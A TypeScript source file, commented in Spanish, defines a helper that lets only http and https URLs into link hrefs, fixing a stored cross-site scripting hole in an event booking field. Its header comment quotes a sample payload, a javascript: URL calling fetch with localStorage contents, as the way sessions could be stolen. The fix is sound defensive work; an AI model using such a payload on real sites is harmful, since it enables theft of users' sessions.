/**
 * URLs de enlaces externos que se pueden pintar en un `href`.
 *
 * `<input type="url">` acepta `javascript:…` —la especificación de HTML lo
 * considera una URL válida— y React 18 sólo avisa por consola de ese tipo de
 * `href`: lo sigue renderizando. Como `events.booking_url` lo escribe
 * cualquier cuenta de local y no había comprobación en el servidor ni en la
 * base de datos, bastaba guardar `javascript:fetch('…'+localStorage…)` para
 * que quien pulsara «Comprar» entregara su sesión.
 */
export const safeHttpUrl = (value: string | null | undefined): string | undefined => {
  const raw = (value ?? '').trim();
  if (!raw) return undefined;

  let parsed: URL;
  try {
    parsed = new URL(raw);
  } catch {
    // Sin esquema no es una dirección completa: no se enlaza.
    return undefined;
  }

  return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? parsed.href : undefined;
};
